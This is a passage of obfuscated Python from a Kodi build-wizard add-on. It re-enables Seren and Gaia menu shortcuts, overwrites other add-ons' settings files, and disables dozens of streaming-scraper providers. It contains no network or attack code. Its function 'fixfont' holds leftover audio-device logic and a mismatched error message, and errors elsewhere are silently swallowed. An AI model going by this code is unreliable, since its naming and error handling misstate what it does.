def rdbuildaddonON ():#line:1182
    OOO00OOO0O0OOOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1184
    with open (OOO00OOO0O0OOOOOO ,'r')as O0OO00000OO0O0000 :#line:1185
      OO0OO0OO0O0OOO0O0 =O0OO00000OO0O0000 .read ()#line:1186
    OO0OO0OO0O0OOO0O0 =OO0OO0OO0O0OOO0O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1204
    with open (OOO00OOO0O0OOOOOO ,'w')as O0OO00000OO0O0000 :#line:1207
      O0OO00000OO0O0000 .write (OO0OO0OO0O0OOO0O0 )#line:1208
    OOO00OOO0O0OOOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1212
    with open (OOO00OOO0O0OOOOOO ,'r')as O0OO00000OO0O0000 :#line:1213
      OO0OO0OO0O0OOO0O0 =O0OO00000OO0O0000 .read ()#line:1214
    OO0OO0OO0O0OOO0O0 =OO0OO0OO0O0OOO0O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1232
    with open (OOO00OOO0O0OOOOOO ,'w')as O0OO00000OO0O0000 :#line:1235
      O0OO00000OO0O0000 .write (OO0OO0OO0O0OOO0O0 )#line:1236
    OOO00OOO0O0OOOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1240
    with open (OOO00OOO0O0OOOOOO ,'r')as O0OO00000OO0O0000 :#line:1241
      OO0OO0OO0O0OOO0O0 =O0OO00000OO0O0000 .read ()#line:1242
    OO0OO0OO0O0OOO0O0 =OO0OO0OO0O0OOO0O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1260
    with open (OOO00OOO0O0OOOOOO ,'w')as O0OO00000OO0O0000 :#line:1263
      O0OO00000OO0O0000 .write (OO0OO0OO0O0OOO0O0 )#line:1264
    OOO00OOO0O0OOOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1268
    with open (OOO00OOO0O0OOOOOO ,'r')as O0OO00000OO0O0000 :#line:1269
      OO0OO0OO0O0OOO0O0 =O0OO00000OO0O0000 .read ()#line:1270
    OO0OO0OO0O0OOO0O0 =OO0OO0OO0O0OOO0O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1288
    with open (OOO00OOO0O0OOOOOO ,'w')as O0OO00000OO0O0000 :#line:1291
      O0OO00000OO0O0000 .write (OO0OO0OO0O0OOO0O0 )#line:1292
    OOO00OOO0O0OOOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1295
    with open (OOO00OOO0O0OOOOOO ,'r')as O0OO00000OO0O0000 :#line:1296
      OO0OO0OO0O0OOO0O0 =O0OO00000OO0O0000 .read ()#line:1297
    OO0OO0OO0O0OOO0O0 =OO0OO0OO0O0OOO0O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1315
    with open (OOO00OOO0O0OOOOOO ,'w')as O0OO00000OO0O0000 :#line:1318
      O0OO00000OO0O0000 .write (OO0OO0OO0O0OOO0O0 )#line:1319
    OOO00OOO0O0OOOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1321
    with open (OOO00OOO0O0OOOOOO ,'r')as O0OO00000OO0O0000 :#line:1322
      OO0OO0OO0O0OOO0O0 =O0OO00000OO0O0000 .read ()#line:1323
    OO0OO0OO0O0OOO0O0 =OO0OO0OO0O0OOO0O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1341
    with open (OOO00OOO0O0OOOOOO ,'w')as O0OO00000OO0O0000 :#line:1344
      O0OO00000OO0O0000 .write (OO0OO0OO0O0OOO0O0 )#line:1345
    OOO00OOO0O0OOOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1347
    with open (OOO00OOO0O0OOOOOO ,'r')as O0OO00000OO0O0000 :#line:1348
      OO0OO0OO0O0OOO0O0 =O0OO00000OO0O0000 .read ()#line:1349
    OO0OO0OO0O0OOO0O0 =OO0OO0OO0O0OOO0O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1367
    with open (OOO00OOO0O0OOOOOO ,'w')as O0OO00000OO0O0000 :#line:1370
      O0OO00000OO0O0000 .write (OO0OO0OO0O0OOO0O0 )#line:1371
    OOO00OOO0O0OOOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1374
    with open (OOO00OOO0O0OOOOOO ,'r')as O0OO00000OO0O0000 :#line:1375
      OO0OO0OO0O0OOO0O0 =O0OO00000OO0O0000 .read ()#line:1376
    OO0OO0OO0O0OOO0O0 =OO0OO0OO0O0OOO0O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1394
    with open (OOO00OOO0O0OOOOOO ,'w')as O0OO00000OO0O0000 :#line:1397
      O0OO00000OO0O0000 .write (OO0OO0OO0O0OOO0O0 )#line:1398
def rdbuildinstallON ():#line:1401
    try :#line:1403
       O0OO0OO00O0O0O0OO =ADDONPATH +"/resources/rd/victory.xml"#line:1404
       OO0OOOO00O0000O00 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1405
       copyfile (O0OO0OO00O0O0O0OO ,OO0OOOO00O0000O00 )#line:1407
       O0OO0OO00O0O0O0OO =ADDONPATH +"/resources/rd/exodusredux.xml"#line:1409
       OO0OOOO00O0000O00 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1410
       copyfile (O0OO0OO00O0O0O0OO ,OO0OOOO00O0000O00 )#line:1412
       O0OO0OO00O0O0O0OO =ADDONPATH +"/resources/rd/openscrapers.xml"#line:1414
       OO0OOOO00O0000O00 =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1415
       copyfile (O0OO0OO00O0O0O0OO ,OO0OOOO00O0000O00 )#line:1417
       O0OO0OO00O0O0O0OO =ADDONPATH +"/resources/rd/Splash.png"#line:1420
       OO0OOOO00O0000O00 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1421
       copyfile (O0OO0OO00O0O0O0OO ,OO0OOOO00O0000O00 )#line:1423
    except :#line:1425
       pass #line:1426
def rdbuild ():#line:1436
	O0O00O0OOOOO000O0 =(ADDON .getSetting ("auto_rd"))#line:1437
	if O0O00O0OOOOO000O0 =='true':#line:1438
		OO000000OOO0OO0OO =xbmcaddon .Addon ('plugin.video.allmoviesin')#line:1439
		OO000000OOO0OO0OO .setSetting ('all_t','0')#line:1440
		OO000000OOO0OO0OO .setSetting ('rd_menu_enable','false')#line:1441
		OO000000OOO0OO0OO .setSetting ('magnet_bay','false')#line:1442
		OO000000OOO0OO0OO .setSetting ('magnet_extra','false')#line:1443
		OO000000OOO0OO0OO .setSetting ('rd_only','false')#line:1444
		OO000000OOO0OO0OO .setSetting ('ftp','false')#line:1446
		OO000000OOO0OO0OO .setSetting ('fp','false')#line:1447
		OO000000OOO0OO0OO .setSetting ('filter_fp','false')#line:1448
		OO000000OOO0OO0OO .setSetting ('fp_size_en','false')#line:1449
		OO000000OOO0OO0OO .setSetting ('afdah','false')#line:1450
		OO000000OOO0OO0OO .setSetting ('ap2s','false')#line:1451
		OO000000OOO0OO0OO .setSetting ('cin','false')#line:1452
		OO000000OOO0OO0OO .setSetting ('clv','false')#line:1453
		OO000000OOO0OO0OO .setSetting ('cmv','false')#line:1454
		OO000000OOO0OO0OO .setSetting ('dl20','false')#line:1455
		OO000000OOO0OO0OO .setSetting ('esc','false')#line:1456
		OO000000OOO0OO0OO .setSetting ('extra','false')#line:1457
		OO000000OOO0OO0OO .setSetting ('film','false')#line:1458
		OO000000OOO0OO0OO .setSetting ('fre','false')#line:1459
		OO000000OOO0OO0OO .setSetting ('fxy','false')#line:1460
		OO000000OOO0OO0OO .setSetting ('genv','false')#line:1461
		OO000000OOO0OO0OO .setSetting ('getgo','false')#line:1462
		OO000000OOO0OO0OO .setSetting ('gold','false')#line:1463
		OO000000OOO0OO0OO .setSetting ('gona','false')#line:1464
		OO000000OOO0OO0OO .setSetting ('hdmm','false')#line:1465
		OO000000OOO0OO0OO .setSetting ('hdt','false')#line:1466
		OO000000OOO0OO0OO .setSetting ('icy','false')#line:1467
		OO000000OOO0OO0OO .setSetting ('ind','false')#line:1468
		OO000000OOO0OO0OO .setSetting ('iwi','false')#line:1469
		OO000000OOO0OO0OO .setSetting ('jen_free','false')#line:1470
		OO000000OOO0OO0OO .setSetting ('kiss','false')#line:1471
		OO000000OOO0OO0OO .setSetting ('lavin','false')#line:1472
		OO000000OOO0OO0OO .setSetting ('los','false')#line:1473
		OO000000OOO0OO0OO .setSetting ('m4u','false')#line:1474
		OO000000OOO0OO0OO .setSetting ('mesh','false')#line:1475
		OO000000OOO0OO0OO .setSetting ('mf','false')#line:1476
		OO000000OOO0OO0OO .setSetting ('mkvc','false')#line:1477
		OO000000OOO0OO0OO .setSetting ('mjy','false')#line:1478
		OO000000OOO0OO0OO .setSetting ('hdonline','false')#line:1479
		OO000000OOO0OO0OO .setSetting ('moviex','false')#line:1480
		OO000000OOO0OO0OO .setSetting ('mpr','false')#line:1481
		OO000000OOO0OO0OO .setSetting ('mvg','false')#line:1482
		OO000000OOO0OO0OO .setSetting ('mvl','false')#line:1483
		OO000000OOO0OO0OO .setSetting ('mvs','false')#line:1484
		OO000000OOO0OO0OO .setSetting ('myeg','false')#line:1485
		OO000000OOO0OO0OO .setSetting ('ninja','false')#line:1486
		OO000000OOO0OO0OO .setSetting ('odb','false')#line:1487
		OO000000OOO0OO0OO .setSetting ('ophd','false')#line:1488
		OO000000OOO0OO0OO .setSetting ('pks','false')#line:1489
		OO000000OOO0OO0OO .setSetting ('prf','false')#line:1490
		OO000000OOO0OO0OO .setSetting ('put18','false')#line:1491
		OO000000OOO0OO0OO .setSetting ('req','false')#line:1492
		OO000000OOO0OO0OO .setSetting ('rftv','false')#line:1493
		OO000000OOO0OO0OO .setSetting ('rltv','false')#line:1494
		OO000000OOO0OO0OO .setSetting ('sc','false')#line:1495
		OO000000OOO0OO0OO .setSetting ('seehd','false')#line:1496
		OO000000OOO0OO0OO .setSetting ('showbox','false')#line:1497
		OO000000OOO0OO0OO .setSetting ('shuid','false')#line:1498
		OO000000OOO0OO0OO .setSetting ('sil_gh','false')#line:1499
		OO000000OOO0OO0OO .setSetting ('spv','false')#line:1500
		OO000000OOO0OO0OO .setSetting ('subs','false')#line:1501
		OO000000OOO0OO0OO .setSetting ('tvs','false')#line:1502
		OO000000OOO0OO0OO .setSetting ('tw','false')#line:1503
		OO000000OOO0OO0OO .setSetting ('upto','false')#line:1504
		OO000000OOO0OO0OO .setSetting ('vel','false')#line:1505
		OO000000OOO0OO0OO .setSetting ('vex','false')#line:1506
		OO000000OOO0OO0OO .setSetting ('vidc','false')#line:1507
		OO000000OOO0OO0OO .setSetting ('w4hd','false')#line:1508
		OO000000OOO0OO0OO .setSetting ('wav','false')#line:1509
		OO000000OOO0OO0OO .setSetting ('wf','false')#line:1510
		OO000000OOO0OO0OO .setSetting ('wse','false')#line:1511
		OO000000OOO0OO0OO .setSetting ('wss','false')#line:1512
		OO000000OOO0OO0OO .setSetting ('wsse','false')#line:1513
		OO000000OOO0OO0OO =xbmcaddon .Addon ('plugin.video.speedmax')#line:1514
		OO000000OOO0OO0OO .setSetting ('debrid.only','true')#line:1515
		OO000000OOO0OO0OO .setSetting ('hosts.captcha','false')#line:1516
		OO000000OOO0OO0OO =xbmcaddon .Addon ('script.module.civitasscrapers')#line:1517
		OO000000OOO0OO0OO .setSetting ('provider.123moviehd','false')#line:1518
		OO000000OOO0OO0OO .setSetting ('provider.300mbdownload','false')#line:1519
		OO000000OOO0OO0OO .setSetting ('provider.alltube','false')#line:1520
		OO000000OOO0OO0OO .setSetting ('provider.allucde','false')#line:1521
		OO000000OOO0OO0OO .setSetting ('provider.animebase','false')#line:1522
		OO000000OOO0OO0OO .setSetting ('provider.animeloads','false')#line:1523
		OO000000OOO0OO0OO .setSetting ('provider.animetoon','false')#line:1524
		OO000000OOO0OO0OO .setSetting ('provider.bnwmovies','false')#line:1525
		OO000000OOO0OO0OO .setSetting ('provider.boxfilm','false')#line:1526
		OO000000OOO0OO0OO .setSetting ('provider.bs','false')#line:1527
		OO000000OOO0OO0OO .setSetting ('provider.cartoonhd','false')#line:1528
		OO000000OOO0OO0OO .setSetting ('provider.cdahd','false')#line:1529
		OO000000OOO0OO0OO .setSetting ('provider.cdax','false')#line:1530
		OO000000OOO0OO0OO .setSetting ('provider.cine','false')#line:1531
		OO000000OOO0OO0OO .setSetting ('provider.cinenator','false')#line:1532
		OO000000OOO0OO0OO .setSetting ('provider.cmovieshdbz','false')#line:1533
		OO000000OOO0OO0OO .setSetting ('provider.coolmoviezone','false')#line:1534
		OO000000OOO0OO0OO .setSetting ('provider.ddl','false')#line:1535
		OO000000OOO0OO0OO .setSetting ('provider.deepmovie','false')#line:1536
		OO000000OOO0OO0OO .setSetting ('provider.ekinomaniak','false')#line:1537
		OO000000OOO0OO0OO .setSetting ('provider.ekinotv','false')#line:1538
		OO000000OOO0OO0OO .setSetting ('provider.filiser','false')#line:1539
		OO000000OOO0OO0OO .setSetting ('provider.filmpalast','false')#line:1540
		OO000000OOO0OO0OO .setSetting ('provider.filmwebbooster','false')#line:1541
		OO000000OOO0OO0OO .setSetting ('provider.filmxy','false')#line:1542
		OO000000OOO0OO0OO .setSetting ('provider.fmovies','false')#line:1543
		OO000000OOO0OO0OO .setSetting ('provider.foxx','false')#line:1544
		OO000000OOO0OO0OO .setSetting ('provider.freefmovies','false')#line:1545
		OO000000OOO0OO0OO .setSetting ('provider.freeputlocker','false')#line:1546
		OO000000OOO0OO0OO .setSetting ('provider.furk','false')#line:1547
		OO000000OOO0OO0OO .setSetting ('provider.gamatotv','false')#line:1548
		OO000000OOO0OO0OO .setSetting ('provider.gogoanime','false')#line:1549
		OO000000OOO0OO0OO .setSetting ('provider.gowatchseries','false')#line:1550
		OO000000OOO0OO0OO .setSetting ('provider.hackimdb','false')#line:1551
		OO000000OOO0OO0OO .setSetting ('provider.hdfilme','false')#line:1552
		OO000000OOO0OO0OO .setSetting ('provider.hdmto','false')#line:1553
		OO000000OOO0OO0OO .setSetting ('provider.hdpopcorns','false')#line:1554
		OO000000OOO0OO0OO .setSetting ('provider.hdstreams','false')#line:1555
		OO000000OOO0OO0OO .setSetting ('provider.horrorkino','false')#line:1557
		OO000000OOO0OO0OO .setSetting ('provider.iitv','false')#line:1558
		OO000000OOO0OO0OO .setSetting ('provider.iload','false')#line:1559
		OO000000OOO0OO0OO .setSetting ('provider.iwaatch','false')#line:1560
		OO000000OOO0OO0OO .setSetting ('provider.kinodogs','false')#line:1561
		OO000000OOO0OO0OO .setSetting ('provider.kinoking','false')#line:1562
		OO000000OOO0OO0OO .setSetting ('provider.kinow','false')#line:1563
		OO000000OOO0OO0OO .setSetting ('provider.kinox','false')#line:1564
		OO000000OOO0OO0OO .setSetting ('provider.lichtspielhaus','false')#line:1565
		OO000000OOO0OO0OO .setSetting ('provider.liomenoi','false')#line:1566
		OO000000OOO0OO0OO .setSetting ('provider.magnetdl','false')#line:1569
		OO000000OOO0OO0OO .setSetting ('provider.megapelistv','false')#line:1570
		OO000000OOO0OO0OO .setSetting ('provider.movie2k-ac','false')#line:1571
		OO000000OOO0OO0OO .setSetting ('provider.movie2k-ag','false')#line:1572
		OO000000OOO0OO0OO .setSetting ('provider.movie2z','false')#line:1573
		OO000000OOO0OO0OO .setSetting ('provider.movie4k','false')#line:1574
		OO000000OOO0OO0OO .setSetting ('provider.movie4kis','false')#line:1575
		OO000000OOO0OO0OO .setSetting ('provider.movieneo','false')#line:1576
		OO000000OOO0OO0OO .setSetting ('provider.moviesever','false')#line:1577
		OO000000OOO0OO0OO .setSetting ('provider.movietown','false')#line:1578
		OO000000OOO0OO0OO .setSetting ('provider.mvrls','false')#line:1580
		OO000000OOO0OO0OO .setSetting ('provider.netzkino','false')#line:1581
		OO000000OOO0OO0OO .setSetting ('provider.odb','false')#line:1582
		OO000000OOO0OO0OO .setSetting ('provider.openkatalog','false')#line:1583
		OO000000OOO0OO0OO .setSetting ('provider.ororo','false')#line:1584
		OO000000OOO0OO0OO .setSetting ('provider.paczamy','false')#line:1585
		OO000000OOO0OO0OO .setSetting ('provider.peliculasdk','false')#line:1586
		OO000000OOO0OO0OO .setSetting ('provider.pelisplustv','false')#line:1587
		OO000000OOO0OO0OO .setSetting ('provider.pepecine','false')#line:1588
		OO000000OOO0OO0OO .setSetting ('provider.primewire','false')#line:1589
		OO000000OOO0OO0OO .setSetting ('provider.projectfreetv','false')#line:1590
		OO000000OOO0OO0OO .setSetting ('provider.proxer','false')#line:1591
		OO000000OOO0OO0OO .setSetting ('provider.pureanime','false')#line:1592
		OO000000OOO0OO0OO .setSetting ('provider.putlocker','false')#line:1593
		OO000000OOO0OO0OO .setSetting ('provider.putlockerfree','false')#line:1594
		OO000000OOO0OO0OO .setSetting ('provider.reddit','false')#line:1595
		OO000000OOO0OO0OO .setSetting ('provider.cartoonwire','false')#line:1596
		OO000000OOO0OO0OO .setSetting ('provider.seehd','false')#line:1597
		OO000000OOO0OO0OO .setSetting ('provider.segos','false')#line:1598
		OO000000OOO0OO0OO .setSetting ('provider.serienstream','false')#line:1599
		OO000000OOO0OO0OO .setSetting ('provider.series9','false')#line:1600
		OO000000OOO0OO0OO .setSetting ('provider.seriesever','false')#line:1601
		OO000000OOO0OO0OO .setSetting ('provider.seriesonline','false')#line:1602
		OO000000OOO0OO0OO .setSetting ('provider.seriespapaya','false')#line:1603
		OO000000OOO0OO0OO .setSetting ('provider.sezonlukdizi','false')#line:1604
		OO000000OOO0OO0OO .setSetting ('provider.solarmovie','false')#line:1605
		OO000000OOO0OO0OO .setSetting ('provider.solarmoviez','false')#line:1606
		OO000000OOO0OO0OO .setSetting ('provider.stream-to','false')#line:1607
		OO000000OOO0OO0OO .setSetting ('provider.streamdream','false')#line:1608
		OO000000OOO0OO0OO .setSetting ('provider.streamflix','false')#line:1609
		OO000000OOO0OO0OO .setSetting ('provider.streamit','false')#line:1610
		OO000000OOO0OO0OO .setSetting ('provider.swatchseries','false')#line:1611
		OO000000OOO0OO0OO .setSetting ('provider.szukajkatv','false')#line:1612
		OO000000OOO0OO0OO .setSetting ('provider.tainiesonline','false')#line:1613
		OO000000OOO0OO0OO .setSetting ('provider.tainiomania','false')#line:1614
		OO000000OOO0OO0OO .setSetting ('provider.tata','false')#line:1617
		OO000000OOO0OO0OO .setSetting ('provider.trt','false')#line:1618
		OO000000OOO0OO0OO .setSetting ('provider.tvbox','false')#line:1619
		OO000000OOO0OO0OO .setSetting ('provider.ultrahd','false')#line:1620
		OO000000OOO0OO0OO .setSetting ('provider.video4k','false')#line:1621
		OO000000OOO0OO0OO .setSetting ('provider.vidics','false')#line:1622
		OO000000OOO0OO0OO .setSetting ('provider.view4u','false')#line:1623
		OO000000OOO0OO0OO .setSetting ('provider.watchseries','false')#line:1624
		OO000000OOO0OO0OO .setSetting ('provider.xrysoi','false')#line:1625
		OO000000OOO0OO0OO .setSetting ('provider.library','false')#line:1626
def fixfont ():#line:1629
	O00OOO00000O0000O =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.GetSettings","id":1}')#line:1630
	OO0O000OO00000OOO =json .loads (O00OOO00000O0000O );#line:1632
	O00OO0O0OO00O0O0O =OO0O000OO00000OOO ["result"]["settings"]#line:1633
	OOO00OO00O0OO0O0O =[OO0O00OOOO0O00000 for OO0O00OOOO0O00000 in O00OO0O0OO00O0O0O if OO0O00OOOO0O00000 ["id"]=="audiooutput.audiodevice"][0 ]#line:1635
	O000OOOOOOOO0O00O =OOO00OO00O0OO0O0O ["options"];#line:1636
	O00000O00OO000OO0 =OOO00OO00O0OO0O0O ["value"];#line:1637
	OOO0OOO0OOO0OOOO0 =[O00O0O00OOO0OOOOO for (O00O0O00OOO0OOOOO ,OO0OO0OOO0O0OO000 )in enumerate (O000OOOOOOOO0O00O )if OO0OO0OOO0O0OO000 ["value"]==O00000O00OO000OO0 ][0 ];#line:1639
	OO0O000OO0OO0OO0O =(OOO0OOO0OOO0OOOO0 +1 )%len (O000OOOOOOOO0O00O )#line:1641
	O0OO0OO0OOO0OOOOO =O000OOOOOOOO0O00O [OO0O000OO0OO0OO0O ]["value"]#line:1643
	OOOOO0000O000OO0O =O000OOOOOOOO0O00O [OO0O000OO0OO0OO0O ]["label"]#line:1644
	OO000O0OOO00O00OO =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","params":{"setting":"subtitles.height","value":40},"id":1}')#line:1646
	try :#line:1648
		OOOOOOO0O0000OO00 =json .loads (OO000O0OOO00O00OO );#line:1649
		if OOOOOOO0O0000OO00 ["result"]!=True :#line:1651
			raise Exception #line:1652
	except :#line:1653
		sys .stderr .write ("Error switching audio output device")#line:1654
		raise Exception #line:1655
def parseDOM2 (OOOOO0O0O0O0O0O00 ,name =u"",attrs ={},ret =False ):#line:1656
	if isinstance (OOOOO0O0O0O0O0O00 ,str ):#line:1659
		try :#line:1660
			OOOOO0O0O0O0O0O00 =[OOOOO0O0O0O0O0O00 .decode ("utf-8")]#line:1661
		except :#line:1662
			OOOOO0O0O0O0O0O00 =[OOOOO0O0O0O0O0O00 ]#line:1663
	elif isinstance (OOOOO0O0O0O0O0O00 ,unicode ):#line:1664
		OOOOO0O0O0O0O0O00 =[OOOOO0O0O0O0O0O00 ]#line:1665
	elif not isinstance (OOOOO0O0O0O0O0O00 ,list ):#line:1666
		return u""#line:1667
	if not name .strip ():#line:1669
		return u""#line:1670
	O0000O0OO0OOO000O =[]#line:1672
	for OO0OOO0O0OO0OO00O in OOOOO0O0O0O0O0O00 :#line:1673
		OO0OO00O0OOOO0000 =re .compile ('(<[^>]*?\n[^>]*?>)').findall (OO0OOO0O0OO0OO00O )#line:1674
		for O0000OO00OOOOO0OO in OO0OO00O0OOOO0000 :#line:1675
			OO0OOO0O0OO0OO00O =OO0OOO0O0OO0OO00O .replace (O0000OO00OOOOO0OO ,O0000OO00OOOOO0OO .replace ("\n"," "))#line:1676
		OOO0000O00OO0OO0O =[]#line:1678
		for OO00O0000O0O00OO0 in attrs :#line:1679
			OOOOOO0OO00O0000O =re .compile ('(<'+name +'[^>]*?(?:'+OO00O0000O0O00OO0 +'=[\'"]'+attrs [OO00O0000O0O00OO0 ]+'[\'"].*?>))',re .M |re .S ).findall (OO0OOO0O0OO0OO00O )#line:1680
			if len (OOOOOO0OO00O0000O )==0 and attrs [OO00O0000O0O00OO0 ].find (" ")==-1 :#line:1681
				OOOOOO0OO00O0000O =re .compile ('(<'+name +'[^>]*?(?:'+OO00O0000O0O00OO0 +'='+attrs [OO00O0000O0O00OO0 ]+'.*?>))',re .M |re .S ).findall (OO0OOO0O0OO0OO00O )#line:1682
			if len (OOO0000O00OO0OO0O )==0 :#line:1684
				OOO0000O00OO0OO0O =OOOOOO0OO00O0000O #line:1685
				OOOOOO0OO00O0000O =[]#line:1686
			else :#line:1687
				O00OO0OO00O000O00 =range (len (OOO0000O00OO0OO0O ))#line:1688
				O00OO0OO00O000O00 .reverse ()#line:1689
				for O0OOO0OO00O0OO000 in O00OO0OO00O000O00 :#line:1690
					if not OOO0000O00OO0OO0O [O0OOO0OO00O0OO000 ]in OOOOOO0OO00O0000O :#line:1691
						del (OOO0000O00OO0OO0O [O0OOO0OO00O0OO000 ])#line:1692
		if len (OOO0000O00OO0OO0O )==0 and attrs =={}:#line:1694
			OOO0000O00OO0OO0O =re .compile ('(<'+name +'>)',re .M |re .S ).findall (OO0OOO0O0OO0OO00O )#line:1695
			if len (OOO0000O00OO0OO0O )==0 :#line:1696
				OOO0000O00OO0OO0O =re .compile ('(<'+name +' .*?>)',re .M |re .S ).findall (OO0OOO0O0OO0OO00O )#line:1697
		if isinstance (ret ,str ):#line:1699
			OOOOOO0OO00O0000O =[]#line:1700
			for O0000OO00OOOOO0OO in OOO0000O00OO0OO0O :#line:1701
				O0000OOO000O0O00O =re .compile ('<'+name +'.*?'+ret +'=([\'"].[^>]*?[\'"])>',re .M |re .S ).findall (O0000OO00OOOOO0OO )#line:1702
				if len (O0000OOO000O0O00O )==0 :#line:1703
